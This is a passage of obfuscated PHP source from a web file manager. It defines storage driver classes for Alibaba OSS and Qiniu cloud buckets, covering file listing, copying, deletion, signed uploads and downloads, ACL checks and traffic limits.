$é¦åÀğµ, $Àˆ»„È); } catch (OSS\Core\OssException $ƒ¾Ó±) { return !1; } return !0; } public function moveFile($Ìœ›ÛŸî, $µÕñ¨Íœ) { if ($this->copyFile($Ìœ›ÛŸî, $µÕñ¨Íœ)) { $this->remove($Ìœ›ÛŸî); return $this->getPathOuter($µÕñ¨Íœ); } return !1; } public function delFile($…êƒÉû÷) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($…êƒÉû÷)); } catch (OSS\Core\OssException $¿‡ŠÃ‡«) { return !1; } return !0; } public function delFolder($§£È­í…) { $¥Ì¡œ¹­ =& $_SERVER[­á Ş³Ö]; if (!$this->exist($§£È­í…)) { return !0; } $this->listItemCache = !1; $’¹ì¢îÂ = $this->fileList($§£È­í…); $this->listItemCache = !0; $¯¡¶¦ª¸ = trim($§£È­í…, $¥Ì¡œ¹­[8]) . $¥Ì¡œ¹­[8]; if (!empty($§£È­í…) && $§£È­í… !== $¥Ì¡œ¹­[198] && !in_array($¯¡¶¦ª¸, $’¹ì¢îÂ[$¥Ì¡œ¹­[82]])) { $’¹ì¢îÂ[$¥Ì¡œ¹­[82]][] = $¯¡¶¦ª¸; } $İòÊÈ’´ = $this->delByBatch($’¹ì¢îÂ[$¥Ì¡œ¹­[83]]); if (!$İòÊÈ’´) { return !1; } $İòÊÈ’´ = $this->delByBatch($’¹ì¢îÂ[$¥Ì¡œ¹­[82]]); if (!$İòÊÈ’´) { return !1; } return $this->delFile($¯¡¶¦ª¸); } private function delByBatch($®ÍÏ‚¢ó) { foreach (array_chunk($®ÍÏ‚¢ó, 1000) as $âÚö°) { try { $this->client->deleteObjects($this->bucket, $âÚö°); } catch (OSS\Core\OssException $ºß„¿ó) { return !1; } } return !0; } public function rename($„ÆÀ‡§•, $‘Ó±£²ä) { return $this->renameObject($„ÆÀ‡§•, $‘Ó±£²ä); } private function fileInfo($Âşİùˆ, $ª÷è›¡ = false, $³õäÍå = array()) { $ş´÷š“ =& $_SERVER[­á Ş³Ö]; $®§Ó¢ı· = array($ş´÷š“[32] => $this->pathThis($Âşİùˆ), $ş´÷š“[84] => $this->getPathOuter($Âşİùˆ), $ş´÷š“[33] => $ş´÷š“[200], $ş´÷š“[76] => isset($³õäÍå[$ş´÷š“[76]]) ? $³õäÍå[$ş´÷š“[76]] : 0, $ş´÷š“[174] => $this->ext($Âşİùˆ)); if ($ª÷è›¡) { return $®§Ó¢ı·; } $®§Ó¢ı·[$ş´÷š“[201]] = $®§Ó¢ı·[$ş´÷š“[85]] = 0; $®§Ó¢ı·[$ş´÷š“[202]] = $®§Ó¢ı·[$ş´÷š“[203]] = !0; if (empty($³õäÍå)) { $’¬Ôœ†¡ = $this->objectMeta($Âşİùˆ); if (!$’¬Ôœ†¡) { return $®§Ó¢ı·; } $³õäÍå = array($ş´÷š“[85] => strtotime($’¬Ôœ†¡[$ş´÷š“[1406]]), $ş´÷š“[76] => $’¬Ôœ†¡[$ş´÷š“[1405]] + 0); } if (isset($³õäÍå[$ş´÷š“[76]])) { $®§Ó¢ı·[$ş´÷š“[76]] = $³õäÍå[$ş´÷š“[76]]; } if (isset($³õäÍå[$ş´÷š“[85]])) { $®§Ó¢ı·[$ş´÷š“[85]] = $³õäÍå[$ş´÷š“[85]]; } if (isset($³õäÍå[$ş´÷š“[180]]) && !trim($®§Ó¢ı·[$ş´÷š“[85]])) { $®§Ó¢ı·[$ş´÷š“[85]] = $³õäÍå[$ş´÷š“[180]]; } return $®§Ó¢ı·; } private function folderInfo($ò£Ÿ‰±„, $‘æÀßÀ = false, $²÷İÏÓ = array()) { $Ÿë£§ù© =& $_SERVER[­á Ş³Ö]; $¿äŒ£ïĞ = array($Ÿë£§ù©[32] => $this->pathThis($ò£Ÿ‰±„), $Ÿë£§ù©[84] => $this->getPathOuter($Ÿë£§ù©[8] . $ò£Ÿ‰±„), $Ÿë£§ù©[33] => $Ÿë£§ù©[75]); if ($‘æÀßÀ) { return $¿äŒ£ïĞ; } $¿äŒ£ïĞ[$Ÿë£§ù©[201]] = $¿äŒ£ïĞ[$Ÿë£§ù©[85]] = 0; $¿äŒ£ïĞ[$Ÿë£§ù©[202]] = $¿äŒ£ïĞ[$Ÿë£§ù©[203]] = !0; if (empty($²÷İÏÓ)) { $ò£Ÿ‰±„ = rtrim($ò£Ÿ‰±„, $Ÿë£§ù©[8]) . $Ÿë£§ù©[8]; $Ğ¿‘Úì¬ = $this->objectMeta($ò£Ÿ‰±„); if (!$Ğ¿‘Úì¬) { return $¿äŒ£ïĞ; } $²÷İÏÓ = array($Ÿë£§ù©[201] => $Ğ¿‘Úì¬[$Ÿë£§ù©[502]][$Ÿë£§ù©[1413]], $Ÿë£§ù©[85] => strtotime($Ğ¿‘Úì¬[$Ÿë£§ù©[1406]])); } if (isset($²÷İÏÓ[$Ÿë£§ù©[85]])) { $¿äŒ£ïĞ[$Ÿë£§ù©[85]] = $²÷İÏÓ[$Ÿë£§ù©[85]]; } if (isset($²÷İÏÓ[$Ÿë£§ù©[201]])) { $¿äŒ£ïĞ[$Ÿë£§ù©[201]] = $²÷İÏÓ[$Ÿë£§ù©[201]]; } return $¿äŒ£ïĞ; } public function listPath($›î‘¾ö‹, $°ª°©—Ë = false) { $«·áóÛ =& $_SERVER[­á Ş³Ö]; $­‰Ê–ë’ = $this->fileList($›î‘¾ö‹, $«·áóÛ[8], !0); foreach ($­‰Ê–ë’[$«·áóÛ[82]] as $ËÕÔ¶ => $“ÒÄÄá­) { $­‰Ê–ë’[$«·áóÛ[82]][$ËÕÔ¶] = $this->folderInfo($“ÒÄÄá­, $°ª°©—Ë, $“ÒÄÄá­); } foreach ($­‰Ê–ë’[$«·áóÛ[83]] as $ËÕÔ¶ => $“ÒÄÄá­) { $­‰Ê–ë’[$«·áóÛ[83]][$ËÕÔ¶] = $this->fileInfo($“ÒÄÄá­[$«·áóÛ[32]], $°ª°©—Ë, $“ÒÄÄá­); } return $­‰Ê–ë’; } protected function infoChildren($ û‘¾Ãí, &$ØúÈä) { $ı„ø¢£ =& $_SERVER[­á Ş³Ö]; $ï€÷Üˆº = $this->fileList($ û‘¾Ãí, $ı„ø¢£[12], !0); $ØúÈä[$ı„ø¢£[78]] += count($ï€÷Üˆº[$ı„ø¢£[82]]); $ØúÈä[$ı„ø¢£[77]] += count($ï€÷Üˆº[$ı„ø¢£[83]]); foreach ($ï€÷Üˆº[$ı„ø¢£[83]] as $ó¨³¡Ï) { if (!$ó¨³¡Ï || !$ó¨³¡Ï[$ı„ø¢£[76]]) { continue; } $ØúÈä[$ı„ø¢£[76]] += $ó¨³¡Ï[$ı„ø¢£[76]]; } } public function has($Ğ ğšÚ, $†…ò¼Ï“ = false, $¨—ÖÖá‡ = true) { $Ü¢„ûÑë =& $_SERVER[­á Ş³Ö]; $Ğ ğšÚ = trim($Ğ ğšÚ, $Ü¢„ûÑë[8]); $½¹âÂ¸ = empty($Ğ ğšÚ) && $Ğ ğšÚ !== $Ü¢„ûÑë[198] ? $Ü¢„ûÑë[12] : $Ğ ğšÚ . $Ü¢„ûÑë[8]; $Ò¶ªò¤ó = $Ü¢„ûÑë[12]; $¼øÁ’çİ = 500; $¥õÍ’õ£ = $ìóñÛÏ¬ = 0; while (!0) { check_abort(); $Ô’êˆòÙ = array($Ü¢„ûÑë[1401] => $Ü¢„ûÑë[8], $Ü¢„ûÑë[1402] => $½¹âÂ¸, $Ü¢„ûÑë[1403] => $¼øÁ’çİ, $Ü¢„ûÑë[1404] => $Ò¶ªò¤ó); try { $«°ˆ™­é = $this->client->listObjects($this->bucket, $Ô’êˆòÙ); } catch (OSS\Core\OssException $ƒïÙö®) { break; } $Ò¶ªò¤ó = $«°ˆ™­é->getNextMarker(); $™î—¬´ = $«°ˆ™­é->getObjectList(); $æ®¨µµ = $«°ˆ™­é->getPrefixList(); if ($†…ò¼Ï“) { if (count($™î—¬´) > 1 || count($™î—¬´) == 1 && $™î—¬´[0]->getKey() != $½¹âÂ¸) { $¥õÍ’õ£ += count($™î—¬´) - 1; } if (!empty($æ®¨µµ)) { $ìóñÛÏ¬ += count($æ®¨µµ); } if ($Ò¶ªò¤ó === $Ü¢„ûÑë[12]) { break; } continue; } if ($¨—ÖÖá‡) { if (!empty($™î—¬´)) { if (count($™î—¬´) > 1 || $™î—¬´[0]->getKey() != $½¹âÂ¸) { return !0; } } } else { if (!empty($æ®¨µµ)) { return !0; } } if ($Ò¶ªò¤ó === $Ü¢„ûÑë[12]) { break; } } if ($†…ò¼Ï“) { return array($Ü¢„ûÑë[207] => $¥õÍ’õ£, $Ü¢„ûÑë[208] => $ìóñÛÏ¬); } return !1; } public function listAll($ƒê®õè±) { $µç½çÎ =& $_SERVER[­á Ş³Ö]; $œ®¹Ù¡ = $this->fileList($ƒê®õè±, $µç½çÎ[12], !0); $­ÃïÁ«Ÿ = array_to_keyvalue($œ®¹Ù¡[$µç½çÎ[83]], $µç½çÎ[32]); foreach ($œ®¹Ù¡[$µç½çÎ[82]] as $¬îƒóåØ) { if (is_string($¬îƒóåØ)) { $­ÃïÁ«Ÿ[$¬îƒóåØ] = array($µç½çÎ[76] => 0); } } return $this->listAllFiles($ƒê®õè±, $­ÃïÁ«Ÿ); } public function canRead($¦¶ôÜ·) { $†£¾Ï¡á =& $_SERVER[­á Ş³Ö]; $ã…ñûáÒ = $this->pathAcl($¦¶ôÜ·); return $ã…ñûáÒ == $†£¾Ï¡á[1414] || $ã…ñûáÒ == $†£¾Ï¡á[547] ? !0 : !1; } public function canWrite($ùªì¹‚) { $½ğ•Öë = $this->pathAcl($ùªì¹‚); return $½ğ•Öë == $_SERVER[­á Ş³Ö][547] ? !0 : !1; } public function pathAcl($¨¶àÕª) { $ÏóùÁ =& $_SERVER[­á Ş³Ö]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $…æ…È½¹ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¨¶àÕª)); } catch (OSS\Core\OssException $çõ×¿î) { return !1; } $øáåæÇ« = $…æ…È½¹ == $ÏóùÁ[37] ? $this->bucketAcl : $…æ…È½¹; if ($øáåæÇ« == $ÏóùÁ[1415]) { return $ÏóùÁ[1414]; } if ($øáåæÇ« == $ÏóùÁ[1416]) { return $ÏóùÁ[547]; } return $øáåæÇ«; } private function chmodPath($ÏœÆª”¢, $é€öÌñ = '') { $Ò¤¿•’Ó =& $_SERVER[­á Ş³Ö]; $öèÆî…¾ = empty($é€öÌñ) ? $Ò¤¿•’Ó[1416] : $é€öÌñ; $È¤²ÊÇŸ = array($Ò¤¿•’Ó[37], $Ò¤¿•’Ó[199], $Ò¤¿•’Ó[1415], $Ò¤¿•’Ó[1416]); if (!in_array($öèÆî…¾, $È¤²ÊÇŸ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÏœÆª”¢), $öèÆî…¾); } catch (OSS\Core\OssException $ÅšƒÔÈ…) { return !1; } return !0; } public function getContent($ûÊê€›—) { return $this->fileSubstr($ûÊê€›—, -1); } public function setContent($Ç„±Ö“Û, $«ø»šÏ¹ = '') { $ÂùîŒ¥¬ =& $_SERVER[­á Ş³Ö]; try { $ëß áç = $this->trafficLimit($ÂùîŒ¥¬[1417]); $úû»¯û³ = $this->client->putObject($this->bucket, $this->pathEncode($Ç„±Ö“Û), $«ø»šÏ¹, $ëß áç); } catch (OSS\Core\OssException $×šÄßîÇ) { return !1; } $»²éïıõ = array($ÂùîŒ¥¬[1407] => trim($úû»¯û³[$ÂùîŒ¥¬[1418]], $ÂùîŒ¥¬[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ç„±Ö“Û))); $this->updateObjMeta($Ç„±Ö“Û, $»²éïıõ); return isset($úû»¯û³[$ÂùîŒ¥¬[1419]][$ÂùîŒ¥¬[1366]]) ? !0 : !1; } private function updateObjMeta($åñŠÔœ, $ÜêÈøÊ«) { $åñŠÔœ = $this->pathEncode($åñŠÔœ); try { $ªİè‡ÌÕ = array(OSS\OssClient::OSS_HEADERS => $ÜêÈøÊ«); $this->client->copyObject($this->bucket, $åñŠÔœ, $this->bucket, $åñŠÔœ, $ªİè‡ÌÕ); } catch (OSS\Core\OssException $Ğ–Â²£‚) { return !1; } return !0; } public function upload($ƒİüø©², $÷Úõ›üî, $¸á“éûÄ = false, $¹ãÒôõÀ = REPEAT_REPLACE) { $Ô©æò =& $_SERVER[­á Ş³Ö]; $ĞèíÉşÇ = trim($ƒİüø©², $Ô©æò[8]); $ç‚‹€ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ô©æò[1407] => @md5_file($÷Úõ›üî)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ƒİüø©²))); $ç‚‹€ = $this->trafficLimit($Ô©æò[1417], $ç‚‹€); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ĞèíÉşÇ), $÷Úõ›üî, $ç‚‹€); } catch (OSS\Core\OssException $§âïº±„) { return !1; } return $this->getPathOuter($ƒİüø©²); } public function getHost() { $êìÖô†â =& $_SERVER[­á Ş³Ö]; $¦äó” = explode($êìÖô†â[184], parent::getHost()); return $¦äó”[0] . $êìÖô†â[184] . $this->bucket . $êìÖô†â[10] . $¦äó”[1]; } public function uploadFormData($¯ˆ½¸áä, $µ®Úúàü = 3600) { $®Û£ÄĞ¶ =& $_SERVER[­á Ş³Ö]; if (!($÷…šœ±¿ = $this->getHost())) { return !1; } $‹×¥„Õ = $µ®Úúàü; $È¹Œ‡¨¾ = date($®Û£ÄĞ¶[1420], time() + $‹×¥„Õ); $ï•ãÊ§ô = new DateTime($È¹Œ‡¨¾); $×Û›õß = $ï•ãÊ§ô->format(DateTime::ISO8601); $¯Äª‰¾Ü = strpos($×Û›õß, $®Û£ÄĞ¶[296]); $×Û›õß = substr($×Û›õß, 0, $¯Äª‰¾Ü) . $®Û£ÄĞ¶[1421]; $²Ë¬Â€¾ = 1048576000 * 5; $ÈçæşÖä = $this->pathFather($¯ˆ½¸áä); $ŞÔ×¶—ú = array($®Û£ÄĞ¶[1320] => $×Û›õß, $®Û£ÄĞ¶[1321] => array(array($®Û£ÄĞ¶[1422], 0, $²Ë¬Â€¾), array($®Û£ÄĞ¶[1324], $®Û£ÄĞ¶[1325], $ÈçæşÖä))); $øÕàø± = base64_encode(json_encode($ŞÔ×¶—ú)); $ù·öĞ¼ = base64_encode(hash_hmac($®Û£ÄĞ¶[232], $øÕàø±, $this->secret, !0)); $ïë«¼Æ¥ = array($®Û£ÄĞ¶[1330] => $øÕàø±, $®Û£ÄĞ¶[1423] => $this->accessKey, $®Û£ÄĞ¶[1326] => $®Û£ÄĞ¶[1318], $®Û£ÄĞ¶[1424] => $ù·öĞ¼, $®Û£ÄĞ¶[182] => $÷…šœ±¿); $ïë«¼Æ¥ = $this->trafficLimit($®Û£ÄĞ¶[1417], $ïë«¼Æ¥); return $ïë«¼Æ¥; } public function multiUploadFormData($ÍØ¶ãÕ, $ˆ‘‚Ü§® = 3600) { $ñùˆã” =& $_SERVER[­á Ş³Ö]; if (!($å²ÑÏ”Á = $this->getHost())) { return !1; } $³ûï¿Ğ± = $this->trafficLimit($ñùˆã”[1417]); $ÌÖ²ä§£ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÍØ¶ãÕ), $³ûï¿Ğ±); return array($ñùˆã”[223] => $ÌÖ²ä§£, $ñùˆã”[182] => $å²ÑÏ”Á . $ñùˆã”[8] . $this->pathEncode($ÍØ¶ãÕ), $ñùˆã”[224] => gmdate($ñùˆã”[1425]), $ñùˆã”[94] => $ÍØ¶ãÕ); } public function multiUploadAuthData($Ÿê§Éşå, $¼íñ¢Í = array()) { $ğÄ€£éò =& $_SERVER[­á Ş³Ö]; $¾ğ®¶Ï· = isset($¼íñ¢Í[$ğÄ€£éò[224]]) ? $¼íñ¢Í[$ğÄ€£éò[224]] : gmdate($ğÄ€£éò[1425]); $•„™Àºõ = isset($¼íñ¢Í[$ğÄ€£éò[174]]) ? $¼íñ¢Í[$ğÄ€£éò[174]] : $ğÄ€£éò[12]; $ùšø¿“± = $Ÿê§Éşå; if (isset($¼íñ¢Í[$ğÄ€£éò[94]])) { $ùšø¿“± = $¼íñ¢Í[$ğÄ€£éò[94]]; unset($¼íñ¢Í[$ğÄ€£éò[94]]); } if (isset($¼íñ¢Í[$ğÄ€£éò[225]])) { $¼íñ¢Í[$ğÄ€£éò[224]] = $¾ğ®¶Ï·; return $this->listUploadParts($ùšø¿“±, $¼íñ¢Í); } $®õùæÛ‘ = array($ğÄ€£éò[226], $ğÄ€£éò[12], $ğÄ€£éò[120], $¾ğ®¶Ï·, "\170\55\157\163\163\x2d\144\141\x74\145\72{$¾ğ®¶Ï·}", $ğÄ€£éò[8] . $this->bucket . $ğÄ€£éò[8] . $ùšø¿“± . $•„™Àºõ); if (strpos($•„™Àºõ, $ğÄ€£éò[227]) === 0) { $®õùæÛ‘[0] = $ğÄ€£éò[228]; if ($µÑ™¨ƒó = $this->trafficLimit($ğÄ€£éò[1417])) { $ùšø¿“± = $ğÄ€£éò[1426]; array_splice($®õùæÛ‘, 5, 0, $ùšø¿“± . $ğÄ€£éò[4] . $µÑ™¨ƒó[$ùšø¿“±]); } } if (isset($¼íñ¢Í[$ğÄ€£éò[229]]) && $¼íñ¢Í[$ğÄ€£éò[229]] == $ğÄ€£éò[230]) { $®õùæÛ‘[0] = $ğÄ€£éò[230]; } if (!empty($¼íñ¢Í[$ğÄ€£éò[1427]])) { $‰ÆùãÈ = array_merge(array($®õùæÛ‘[4]), $¼íñ¢Í[$ğÄ€£éò[1427]]); sort($‰ÆùãÈ); $®õùæÛ‘[4] = implode($ğÄ€£éò[231], $‰ÆùãÈ); } $…Äµ‡Á = implode($ğÄ€£éò[231], $®õùæÛ‘); $©ŸßŠ™Ö = base64_encode(hash_hmac($ğÄ€£éò[232], $…Äµ‡Á, $this->secret, !0)); $½œå®üÎ = $ğÄ€£éò[1391] . $this->accessKey . $ğÄ€£éò[4] . $©ŸßŠ™Ö; if (strpos($•„™Àºõ, $ğÄ€£éò[227]) === 0) { $½œå®üÎ = array($ğÄ€£éò[234] => $½œå®üÎ, $ğÄ€£éò[224] => $¾ğ®¶Ï·); if ($µÑ™¨ƒó) { $½œå®üÎ = array_merge($½œå®üÎ, $µÑ™¨ƒó); } } return $½œå®üÎ; } public function listUploadParts($€âĞı¼, $¯ı–Ü»Í) { $ê¯×Àùú =& $_SERVER[­á Ş³Ö]; $Åà¿“¥” = parse_url_query($¯ı–Ü»Í[$ê¯×Àùú[174]]); $³øÎÏ¬ = $this->client->listParts($this->bucket, $this->pathEncode($€âĞı¼), $Åà¿“¥”[$ê¯×Àùú[223]]); $× €Ìº× = $³øÎÏ¬->getListPart(); $Ê‡¥ê‘ê = array(); foreach ($× €Ìº× as $‡ô¬«œÀ) { $Ê‡¥ê‘ê[] = array($ê¯×Àùú[1411] => $‡ô¬«œÀ->getPartNumber(), $ê¯×Àùú[1412] => trim($‡ô¬«œÀ->getETag(), $ê¯×Àùú[118])); } unset($¯ı–Ü»Í[$ê¯×Àùú[225]], $¯ı–Ü»Í[$ê¯×Àùú[229]]); $ˆÖÏë³ = $this->multiUploadAuthData($€âĞı¼, $¯ı–Ü»Í); if (empty($ˆÖÏë³)) { return !1; } return array($ê¯×Àùú[234] => $ˆÖÏë³, $ê¯×Àùú[224] => $¯ı–Ü»Í[$ê¯×Àùú[224]], $ê¯×Àùú[236] => $Ê‡¥ê‘ê); } public function download($şŞåÊÍ«, $ğ½áŸ£Õ) { if ($this->isFolder($şŞåÊÍ«)) { return !1; } try { $ÚÂµÂğ‡ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ğ½áŸ£Õ); $ÚÂµÂğ‡ = $this->trafficLimit($_SERVER[­á Ş³Ö][109], $ÚÂµÂğ‡); $this->client->getObject($this->bucket, $this->pathEncode($şŞåÊÍ«), $ÚÂµÂğ‡); } catch (OSS\Core\OssException $²ÃÇ™ó) { return !1; } return $ğ½áŸ£Õ; } public function fileSubstr($ÃØøÊæÒ, $ìÇçóñ = 0, $„­ÊÑñú = false) { if ($ìÇçóñ === -1) { $îîÖ½¼ƒ = array(); } else { if ($„­ÊÑñú === !1) { $Îõ­™öù = $this->size($ÃØøÊæÒ); } else { $Îõ­™öù = $ìÇçóñ + $„­ÊÑñú - 1; } $îîÖ½¼ƒ = array(OSS\OssClient::OSS_RANGE => "{$ìÇçóñ}\55{$Îõ­™öù}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÃØøÊæÒ), $îîÖ½¼ƒ); } catch (OSS\Core\OssException $Ü•èÍœ) { think_exception($Ü•èÍœ->getMessage()); return !1; } } private function trafficLimit($Ğ½›‹„ü, $±¬¤şĞä = array()) { $ì¡Ê‘»ü =& $_SERVER[­á Ş³Ö]; if ($Ğ½›‹„ü == $ì¡Ê‘»ü[1417] && $this->isUploadServer() || $Ğ½›‹„ü == $ì¡Ê‘»ü[109] && $this->isFileOutServer()) { return $±¬¤şĞä; } $ªÉ¹å¥ñ = floatval($GLOBALS[$ì¡Ê‘»ü[6]][$ì¡Ê‘»ü[89]][$ì¡Ê‘»ü[107]][$Ğ½›‹„ü]) * 1024 * 1024 * 8; if (!$ªÉ¹å¥ñ) { return $±¬¤şĞä; } $ªÉ¹å¥ñ = $ªÉ¹å¥ñ < 819200 ? 819200 : ($ªÉ¹å¥ñ > 838860800 ? 838860800 : $ªÉ¹å¥ñ); $±¬¤şĞä[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ªÉ¹å¥ñ); return $±¬¤şĞä; } public function link($Î±‚£ï, $òã‹ºÎ = array()) { $ØÓÅíå” =& $_SERVER[­á Ş³Ö]; if (!$this->exist($Î±‚£ï) || $this->isFolder($Î±‚£ï)) { return !1; } try { $òã‹ºÎ = $this->trafficLimit($ØÓÅíå”[109], $òã‹ºÎ); $¢î¤€¯ = $this->client->signUrl($this->bucket, $this->pathEncode($Î±‚£ï), 3600 * 12, $ØÓÅíå”[230], $òã‹ºÎ); return $this->getCdnLink($¢î¤€¯); } catch (OSS\Core\OssException $é‘Ç¬¾ˆ) { return !1; } } public function fileOut($¨×•İˆ, $‹ç‡¬– = false, $Öş‡€•æ = false, $˜ì¡àŒü = '') { $ÂÈô’ÔÇ =& $_SERVER[­á Ş³Ö]; if ($this->isFileOutServer()) { return $this->fileOutServer($¨×•İˆ, $‹ç‡¬–, $Öş‡€•æ, $˜ì¡àŒü); } if (!$Öş‡€•æ) { $Öş‡€•æ = $this->pathThis($¨×•İˆ); } $Öş‡€•æ = rawurlencode($Öş‡€•æ); $Ûã¦çƒ = get_file_mime(get_path_ext($Öş‡€•æ)); if ($Ûã¦çƒ == $ÂÈô’ÔÇ[217]) { return parent::fileOut($¨×•İˆ, $‹ç‡¬–, $Öş‡€•æ, $˜ì¡àŒü); } $‹ç‡¬– = $‹ç‡¬– ? $ÂÈô’ÔÇ[1428] : $ÂÈô’ÔÇ[1429]; $‰ÚçÒº = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÂÈô’ÔÇ[1430] . rawurlencode("{$‹ç‡¬–}\73\x66\151\x6c\x65\156\x61\x6d\145\75{$Öş‡€•æ}")); $‰ÚçÒº[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÂÈô’ÔÇ[1431] . rawurlencode($Ûã¦çƒ); $‹ìÍ«úÚ = $this->link($¨×•İˆ, $‰ÚçÒº); $this->fileOutLink($‹ìÍ«úÚ); } public function fileOutServer($®³¦íŞĞ, $´ñÑ÷Éİ = false, $’Ÿé²İ = false, $üå¬äßü = '') { parent::fileOut($®³¦íŞĞ, $´ñÑ÷Éİ, $’Ÿé²İ, $üå¬äßü); } public function fileOutImage($É¾ëåÊ¼, $ÑÔšå–‹ = 250) { $áÎûÇ…’ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[­á Ş³Ö][1432] . $ÑÔšå–‹); $×¤Šöäî = $this->link($É¾ëåÊ¼, $áÎûÇ…’); $this->fileOutLink($×¤Šöäî); } public function fileOutImageServer($ï“ •»ˆ, $ÛÌÀ… ¹ = 250) { parent::fileOutImage($ï“ •»ˆ, $ÛÌÀ… ¹); } public function fileOutLink($Ç—ÂÎ†„) { $åç©–º =& $_SERVER[­á Ş³Ö]; if (!$this->isCdnHost() && substr($Ç—ÂÎ†„, 0, 7) == $åç©–º[1333]) { $Ç—ÂÎ†„ = $åç©–º[1334] . substr($Ç—ÂÎ†„, 7); } header($åç©–º[161] . $Ç—ÂÎ†„); die; } public function hashMd5($Ë¸¬ , $¶ğó¸Ù— = '') { $ö±İ‰­ñ =& $_SERVER[­á Ş³Ö]; $  ˆÕ‹« = $this->_objectMeta($Ë¸¬ ); if (!$  ˆÕ‹«) { return $ö±İ‰­ñ[12]; } if (!isset($  ˆÕ‹«[$ö±İ‰­ñ[1407]]) && !empty($¶ğó¸Ù—)) { $‚ÆöÁ«º = $this->updateObjMeta($Ë¸¬ , array($ö±İ‰­ñ[1407] => $¶ğó¸Ù—)); $  ˆÕ‹«[$ö±İ‰­ñ[1407]] = $‚ÆöÁ«º ? $¶ğó¸Ù— : $ö±İ‰­ñ[12]; } return isset($  ˆÕ‹«[$ö±İ‰­ñ[1407]]) ? strtolower($  ˆÕ‹«[$ö±İ‰­ñ[1407]]) : $ö±İ‰­ñ[12]; } public function size($óŒ½êƒ) { $ƒŒæ¥¨Â = $this->objectMeta($óŒ½êƒ); return $ƒŒæ¥¨Â ? $ƒŒæ¥¨Â[$_SERVER[­á Ş³Ö][76]] : 0; } public function info($®·è”«) { if ($this->isFolder($®·è”«)) { return $this->folderInfo($®·è”«); } else { if ($this->isFile($®·è”«)) { return $this->fileInfo($®·è”«); } } return !1; } public function exist($ºÎ¡°î½) { return $this->isFile($ºÎ¡°î½) || $this->isFolder($ºÎ¡°î½); } public function isFile($ÀãÜêÅ¢) { return !$this->isFolder($ÀãÜêÅ¢) && $this->objectMeta($ÀãÜêÅ¢); } public function isFolder($µóöÔ†æ) { return $this->cacheMethod($_SERVER[­á Ş³Ö][165], $µóöÔ†æ); } protected function objectMeta($ÂãòŸÕ) { return $this->cacheMethod($_SERVER[­á Ş³Ö][167], $ÂãòŸÕ); } protected function _objectMeta($°®ÖˆÄü) { $‚öÛÀ™ =& $_SERVER[­á Ş³Ö]; try { $Šô¨ğè = $this->client->getObjectMeta($this->bucket, $this->pathEncode($°®ÖˆÄü)); } catch (OSS\Core\OssException $º‚İöŞ) { $Šô¨ğè = !1; } if ($Šô¨ğè) { $Šô¨ğè[$‚öÛÀ™[76]] = intval($Šô¨ğè[$‚öÛÀ™[1405]]); } return $Šô¨ğè; } protected function _isFolder($İ±ÖåÂ) { $¾ê…ë•Ì =& $_SERVER[­á Ş³Ö]; if ($İ±ÖåÂ == $¾ê…ë•Ì[12] || $İ±ÖåÂ == $¾ê…ë•Ì[8]) { return !0; } $¡•ù = array($¾ê…ë•Ì[1401] => $¾ê…ë•Ì[8], $¾ê…ë•Ì[1402] => rtrim($İ±ÖåÂ, $¾ê…ë•Ì[8]) . $¾ê…ë•Ì[8], $¾ê…ë•Ì[1403] => 1, $¾ê…ë•Ì[1404] => $¾ê…ë•Ì[12]); $ƒ²µâÇí = $this->client->listObjects($this->bucket, $¡•ù); if ($ƒ²µâÇí->getObjectList() || $ƒ²µâÇí->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($³Øßİ¥) { parent::__construct(); require_once SDK_DIR . $_SERVER[­á Ş³Ö][1433]; $this->_init($³Øßİ¥); } public function _init($“ß‹‡¿ô) { $ÈÂıñ¦œ =& $_SERVER[­á Ş³Ö]; $this->config = $“ß‹‡¿ô; foreach ($“ß‹‡¿ô as $šûŸº¾‘ => $æó÷¼Ã¿) { if (isset($this->{$šûŸº¾‘})) { $this->{$šûŸº¾‘} = $æó÷¼Ã¿; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÈÂıñ¦œ[1434] . LNG($ÈÂıñ¦œ[1392])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¨êõ²ì¿, $±ÓöëÍ× = '', $ÉÖ¥ñµ = REPEAT_RENAME) { if ($this->setContent($¨êõ²ì¿, $±ÓöëÍ×)) { return $this->getPathOuter($¨êõ²ì¿); } return !1; } public function mkdir($àáÜšŸ, $ìÒÂÄŸœ = REPEAT_SKIP) { $Ê›‰²ï´ =& $_SERVER[­á Ş³Ö]; $³Â¶äüÍ = trim($àáÜšŸ, $Ê›‰²ï´[8]); if ($this->_isFolder($³Â¶äüÍ)) { return $this->getPathOuter($³Â¶äüÍ); } $àáÜšŸ = $³Â¶äüÍ . $Ê›‰²ï´[8]; $›¸ùˆÉ® = get_path_this($³Â¶äüÍ); $‘Ñ¿®Áİ = $àáÜšŸ . $›¸ùˆÉ®; if (!$this->mkfile($‘Ñ¿®Áİ)) { return !1; } if (!$this->moveFile($‘Ñ¿®Áİ, $àáÜšŸ)) { $this->delFile($‘Ñ¿®Áİ); return !1; } return $this->getPathOuter($³Â¶äüÍ); } 